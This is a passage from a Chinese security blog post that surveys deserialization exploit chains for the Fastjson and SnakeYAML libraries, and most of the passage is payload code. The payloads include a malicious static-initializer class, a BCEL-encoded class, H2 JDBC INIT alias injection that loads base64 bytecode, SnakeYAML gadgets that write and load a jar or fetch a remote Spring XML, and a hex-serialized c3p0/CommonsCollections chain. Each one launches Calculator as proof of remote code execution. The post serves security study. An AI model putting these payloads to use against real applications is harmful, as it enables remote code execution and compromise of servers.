将方法移到main外部</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] fileToBinArray(File file) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            <span class="type">byte</span>[] bytes = FileCopyUtils.copyToByteArray(fis);</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;transform file into bin Array 出错&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>恶意类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.java_study.byteloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Payload：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">`\ <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span></span><br><span class="line">                    <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                            + <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                            + <span class="string">&quot;        \&quot;aaa\&quot;: &#123;\n&quot;</span></span><br><span class="line">                            + <span class="string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span></span><br><span class="line">                            + <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span></span><br><span class="line">                            + <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span></span><br><span class="line">                            + <span class="string">&quot;                &#125;,\n&quot;</span></span><br><span class="line">                            + <span class="string">&quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeR$dbn$T1$Q$3dn$b6q$ba$5d$d2$h$F$Km$80$5ePZP$fd$c2$5b$K$S$8aZ$J5$a1$88E$m$E$Sr$i$xr$d9$acW$bb$de$d2$7c$R$cf$7d$v$I$J$3e$80$8fB$8cC$d5$L$d8$92g$7c$e6$cc$cd$e3_$bf$bf$ff$E$f0$Y$PBLa$n$c4u$yr$dc$a8$e1$a6Wo$85X$c2m$8e$3b$i$cb$i$x$M$d5$j$93$g$f7$94$a1$d2$dc$7c$c3$Q$b4m_3$cctL$aa_$94$c3$9e$ce_$cb$5eBHmG$rg$cck$b1$93$eaSWfc$T$c5b$Ic$5b$e6J$ef$ZO$9d$da$3d2$c9$f6$a1$3c$92$RBLs4$o$dc$c5$3d$86Y$8f$89D$a6$D$R$bb$dc$a4$D$86$t$o$k$VN$P$c5$b3$yK$8c$92$ce$d8$b4$Qm$99$a82$91$ce$e6$db2$cbD$db$a6N$a7$ae$Q$5d$a9$O$e2K$d6$I$f7$b1$ca$b1$Wa$j$h$M$L$X$f1w$8f$95$ce$7c0$86$86$cd$H$c2$5b$3e$W$ae$ec$8fDo$e4tbe_$e7$c2$Xz$a5$ac$83$de$a1V$8ea$ee$CzU$a6$ce$M$a9$adp$a0$dd$f9e$b1$b9$d9$f9$8f$d3$a2$f7$d3$c7Z14$9b$ef$3b$ff6$db$ba$ec$f12$b7J$XE$ebJ$aa3$90$81$7f$96$c6$ed$d9$7c$3c$95$e7$d4d$8dF$e9$d7$E$98$7fR$3a$p$ba$ad$90d$q$t$b7$be$82$9d$90B$b3$a1$b3$fa$X$q$a7$fa9U$n$40$85d$e3$h$s$f6$83$l$a8$bc$ab$cc$Hqg$eb$e1$v$s$bb$8fNQ$7d$fb$F$c1$fe$c9$d8s$J$cb$e0$94$ca$c7j$90$G$8a$UP$Bu$f8$l4M$f6$3a1$oJ$3fC$h$9e$fb$81c$d6$a7$9f$h$d78$ff$H$cfb$P$c6$84$C$A$A\n\&quot;\n&quot;</span></span><br><span class="line">                            + <span class="string">&quot;        &#125;\n&quot;</span></span><br><span class="line">                            + <span class="string">&quot;    &#125;:\&quot;xxx\&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>



<p>![截屏2025-05-26 16.59.47](/Users/mac/Desktop/截屏2025-05-26 16.59.47.png)</p>
<h3 id="org-h2-jdbcx-JdbcDataSource"><a href="#org-h2-jdbcx-JdbcDataSource" class="headerlink" title="org.h2.jdbcx.JdbcDataSource"></a>org.h2.jdbcx.JdbcDataSource</h3><h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;org.h2.jdbcx.JdbcDataSource\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.alibaba.fastjson.JSONObject\&quot;,\&quot;c\&quot;:&#123;\&quot;@type\&quot;:\&quot;org.h2.jdbcx.JdbcDataSource\&quot;, \&quot;url\&quot;:\&quot;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\\\;CREATE ALIAS EXEC AS &#x27;void exec() throws java.io.IOException &#123; try &#123; byte[] b = java.util.Base64.getDecoder().decode(\\\&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAA1ieXRlX2V4cC5qYXZhDAAHAAgHABwMAB0AHgEAPS9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwL0NvbnRlbnRzL01hY09TL0NhbGN1bGF0b3IMAB8AIAEAFG9yZy9leGFtcGxlL2J5dGVfZXhwAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAEAAEADAABAA0ADgACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAA8AAQANABAAAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABQACwAAAAQAAQAPAAEAEQAAAAIAEg==\\\&quot;)\\\\; java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(\\\&quot;defineClass\\\&quot;, byte[].class, int.class, int.class)\\\\; method.setAccessible(true)\\\\; Class c = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), b, 0, b.length)\\\\; c.newInstance()\\\\; &#125; catch (Exception e)&#123; &#125;&#125;&#x27;\\\\;CALL EXEC ()\\\\;\&quot;&#125;&#125;:&#123;&#125;&#125;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;[&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;org.h2.jdbcx.JdbcDataSource\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;org.h2.jdbcx.JdbcDataSource\&quot;, \&quot;url\&quot;:\&quot;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\\\;CREATE ALIAS EXEC AS &#x27;void exec() throws java.io.IOException &#123; try &#123; byte[] b = java.util.Base64.getDecoder().decode(\\\&quot;byteCodes\\\&quot;)\\\\; java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(\\\&quot;defineClass\\\&quot;, byte[].class, int.class, int.class)\\\\; method.setAccessible(true)\\\\; Class c = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), b, 0, b.length)\\\\; c.newInstance()\\\\; &#125; catch (Exception e)&#123; &#125;&#125;&#x27;\\\\;CALL EXEC ()\\\\;\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[1].connection\&quot;&#125;]&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="payload解析"><a href="#payload解析" class="headerlink" title="payload解析"></a>payload解析</h4><p>POC中存在5个参数：<br>    JDBC的完整URL<br>    JDBC的属性列表，类型是Java中的 Hashtable ，对应到YAML中就是一个map<br>    连接用户名<br>    连接密码<br>    是否禁止创建数据库（forbidCreation）</p>
<p>其中，forbidCreation，用于禁止创建新的数据库，当forbidCreation等于true时，必须在目标服务器上找到一个已经存在的h2数据库文件进行连接才能执行后续JDBC注入操作，内存数据库 jdbc:h2:mem 也无法使用</p>
<p>但是JdbcConnection的构造函数支持让攻击者直接控制所有参数，所以直接将其设置为false即可</p>
<ul>
<li>为什么出现这么多转义？<br>在第一个参数中，传入的是url，由于要在INIT中执行多个SQL语句，所以我使用了反斜线对分号进行转义<br><code>\; </code>，但又由于整个URL位于YAML中的字符串中，所以还要再次对反斜线进行转义<code> \\;</code></li>
</ul>
<h2 id="SnakeYAML利用链"><a href="#SnakeYAML利用链" class="headerlink" title="SnakeYAML利用链"></a>SnakeYAML利用链</h2><h3 id="FastJson与SnakeYAML区别"><a href="#FastJson与SnakeYAML区别" class="headerlink" title="FastJson与SnakeYAML区别"></a>FastJson与SnakeYAML区别</h3><p>![截屏2025-05-26 17.14.35](/Users/mac/Library/Application Support/typora-user-images/截屏2025-05-26 17.14.35.png)</p>
<p>可以看到区别是getter和constructor的区别</p>
<p>找到SnakeYAML的利用链只需要去寻找Fastjson中不需要getter的利用链</p>
<h3 id="sun-rmi-server-MarshalOutputStream与javax-script-ScriptEngineManager"><a href="#sun-rmi-server-MarshalOutputStream与javax-script-ScriptEngineManager" class="headerlink" title="sun.rmi.server.MarshalOutputStream与javax.script.ScriptEngineManager"></a>sun.rmi.server.MarshalOutputStream与javax.script.ScriptEngineManager</h3><p>SnakeYAML的constructor使用无条件，可以考虑到sun.rmi.server.MarshalOutputStream这条链子可以写入jar文件</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!sun.rmi.server.MarshalOutputStream</span> [<span class="type">!!java.util.zip.InflaterOutputStream</span></span><br><span class="line">[<span class="type">!!java.io.FileOutputStream</span> [<span class="type">!!java.io.File</span></span><br><span class="line">[<span class="string">&quot;success.jar&quot;</span>],<span class="literal">false</span>],<span class="type">!!java.util.zip.Inflater</span> &#123; <span class="attr">input:</span> <span class="type">!!binary</span> <span class="string">eJxLLE5JTCkGAAh5AnE=</span></span><br><span class="line">&#125;,<span class="number">1048576</span>]]</span><br></pre></td></tr></table></figure>



<p>再使用javax.script.ScriptEngineManager 加载本地的Jar包，从而可以完成不出网利用</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [<span class="type">!!java.net.URLClassLoader</span> [[<span class="type">!!java.net.URL</span></span><br><span class="line">[<span class="string">&quot;file:///success.jar&quot;</span>]]]]</span><br></pre></td></tr></table></figure>



<h3 id="org-springframework-context-support-ClassPathXmlApplicationContext"><a href="#org-springframework-context-support-ClassPathXmlApplicationContext" class="headerlink" title="org.springframework.context.support.ClassPathXmlApplicationContext"></a>org.springframework.context.support.ClassPathXmlApplicationContext</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!org.springframework.context.support.ClassPathXmlApplicationContext</span> [</span><br><span class="line"><span class="string">&quot;http://example.com/spring.xml&quot;</span> ]</span><br></pre></td></tr></table></figure>

<p>这个需要出网，如果不出网，可以先使用sun.rmi.server.MarshalOutputStream先写入xml文件后再去命令执行</p>
<h3 id="org-h2-jdbcx-JdbcDataSource-1"><a href="#org-h2-jdbcx-JdbcDataSource-1" class="headerlink" title="org.h2.jdbcx.JdbcDataSource"></a>org.h2.jdbcx.JdbcDataSource</h3><p>根据fastjson的链子，同样可以写出来snakeyaml的利用链：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;!!org.h2.jdbc.JdbcConnection [ \&quot;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if\n&quot;</span> <span class="string">+</span>  </span><br><span class="line">        <span class="string">&quot;exists exec\\\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException &#123;\n&quot;</span> <span class="string">+</span>  </span><br><span class="line">        <span class="string">&quot;Runtime.getRuntime().exec(\\\&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator\\\&quot;)\\\\; &#125;$$\\\\;CALL EXEC ()\\\\;\&quot;, &#123;&#125;, \&quot;a\&quot;, \&quot;b\&quot;, false ]&quot;</span></span><br></pre></td></tr></table></figure>



<p>利用yaml语法优化格式</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!org.h2.jdbc.JdbcConnection</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">jdbc:h2:mem:test</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">MODE:</span> <span class="string">MSSQLServer</span></span><br><span class="line">  <span class="attr">INIT:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    drop alias if exists exec;</span></span><br><span class="line"><span class="string">    CREATE ALIAS EXEC AS $$void exec() throws Exception &#123;Runtime.getRuntime().exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);&#125;$$;</span></span><br><span class="line"><span class="string">    CALL EXEC ();</span></span><br><span class="line"><span class="string"></span><span class="bullet">-</span> <span class="string">a</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">b</span></span><br><span class="line"><span class="bullet">-</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>



<h3 id="c3p0链"><a href="#c3p0链" class="headerlink" title="c3p0链"></a>c3p0链</h3><h4 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</span><br><span class="line">  userOverridesAsString: &quot;HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C77080000001000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740004746573747372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000047372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65707400096765744D6574686F64757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A99020000787000000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001C7371007E00137571007E00180000000271007E001270740006696E766F6B657571007E001C00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E00187371007E00137571007E00180000000174003D2F53797374656D2F4170706C69636174696F6E732F43616C63756C61746F722E6170702F436F6E74656E74732F4D61634F532F43616C63756C61746F72740004657865637571007E001C0000000171007E001F7371007E00003F4000000000000C7708000000100000000078787400034E313178;&quot;</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://N11-study.github.io">N11</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://n11-study.github.io/2025/05/26/fastjson%E5%88%A9%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93%E4%B8%8ESnakeYAML%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84%E6%8E%A2%E5%AF%BB/">https://n11-study.github.io/2025/05/26/fastjson%E5%88%A9%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93%E4%B8%8ESnakeYAML%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84%E6%8E%A2%E5%AF%BB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://N11-study.github.io" target="_blank">N11's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://n11-blogs.oss-cn-chengdu.aliyuncs.com/img/202410211032888.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/03/12/Rosenblatt%E6%84%9F%E7%9F%A5%E5%99%A8%E4%B8%8E%E6%96%B9%E5%B7%AE%E4%BB%A3%E4%BB%B7%E5%87%BD%E6%95%B0/" title="Rosenblatt感知器与方差代价函数"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Rosenblatt感知器与方差代价函数</div></div><div class="info-2"><div class="info-item-1">概念Rosenblatt感知器是由Frank Rosenblatt在1957年提出的一种人工神经网络模型，主要用于二元分类任务。它是早期神经网络和机器学习的重要基础之一。 主要特点 结构简单： 输入层：接收特征向量。 输出层：一个神经元，输出二元结果（如+1或-1）。   学习规则： 采用感知器学习算法，通过调整权重来最小化分类误差。 权重更新公式：wi=wi+η(y−y^)xiwi​=wi​+η(y−y^​)xi​ wi​：权重 η：学习率 y：真实标签 y^​：预测输出 xi​：输入特征     激活函数： 使用阶跃函数，输出为+1或-1。    优点 简单易实现，适合线性可分问题。  局限性 只能处理线性可分数据，无法解决非线性问题（如异或问题）。  历史意义 为后续神经网络（如多层感知器）的发展奠定了基础。  总结Rosenblatt感知器是早期的二元分类模型，尽管功能有限，但在神经网络和机器学习的发展中具有重要地位。 尝试线性散点图实现 123456789101112131415161718import numpy as np  import...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://n11-blogs.oss-cn-chengdu.aliyuncs.com/img/202410211032888.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">N11</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/n11-study"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">Fastjson利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-number">1.1.</span> <span class="toc-text">JdbcRowSetImpl</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-number">1.1.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload%E7%9A%84%E5%89%96%E6%9E%90"><span class="toc-number">1.1.2.</span> <span class="toc-text">Payload的剖析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">1.2.</span> <span class="toc-text">TemplatesImpl</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#com-mchange-v2-c3p0-WrapperConnectionPoolDataSource%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">com.mchange.v2.c3p0.WrapperConnectionPoolDataSource：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sun-rmi-server-MarshalOutputStream"><span class="toc-number">1.4.</span> <span class="toc-text">sun.rmi.server.MarshalOutputStream</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.4.1.</span> <span class="toc-text">利用条件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#com-sun-org-apache-bcel-internal-util-ClassLoader"><span class="toc-number">1.5.</span> <span class="toc-text">com.sun.org.apache.bcel.internal.util.ClassLoader</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-3"><span class="toc-number">1.5.1.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#org-h2-jdbcx-JdbcDataSource"><span class="toc-number">1.6.</span> <span class="toc-text">org.h2.jdbcx.JdbcDataSource</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-4"><span class="toc-number">1.6.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload%E8%A7%A3%E6%9E%90"><span class="toc-number">1.6.2.</span> <span class="toc-text">payload解析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SnakeYAML%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">SnakeYAML利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJson%E4%B8%8ESnakeYAML%E5%8C%BA%E5%88%AB"><span class="toc-number">2.1.</span> <span class="toc-text">FastJson与SnakeYAML区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sun-rmi-server-MarshalOutputStream%E4%B8%8Ejavax-script-ScriptEngineManager"><span class="toc-number">2.2.</span> <span class="toc-text">sun.rmi.server.MarshalOutputStream与javax.script.ScriptEngineManager</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#org-springframework-context-support-ClassPathXmlApplicationContext"><span class="toc-number">2.3.</span> <span class="toc-text">org.springframework.context.support.ClassPathXmlApplicationContext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#org-h2-jdbcx-JdbcDataSource-1"><span class="toc-number">2.4.</span> <span class="toc-text">org.h2.jdbcx.JdbcDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c3p0%E9%93%BE"><span class="toc-number">2.5.</span> <span class="toc-text">c3p0链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-5"><span class="toc-number">2.5.1.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/26/fastjson%E5%88%A9%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93%E4%B8%8ESnakeYAML%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84%E6%8E%A2%E5%AF%BB/" title="fastjson利用链总结与SnakeYAML不出网利用链的探寻">fastjson利用链总结与SnakeYAML不出网利用链的探寻</a><time datetime="2025-05-26T10:26:42.000Z" title="发表于 2025-05-26 18:26:42">2025-05-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/12/Rosenblatt%E6%84%9F%E7%9F%A5%E5%99%A8%E4%B8%8E%E6%96%B9%E5%B7%AE%E4%BB%A3%E4%BB%B7%E5%87%BD%E6%95%B0/" title="Rosenblatt感知器与方差代价函数">Rosenblatt感知器与方差代价函数</a><time datetime="2025-03-11T17:14:01.000Z" title="发表于 2025-03-12 01:14:01">2025-03-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" 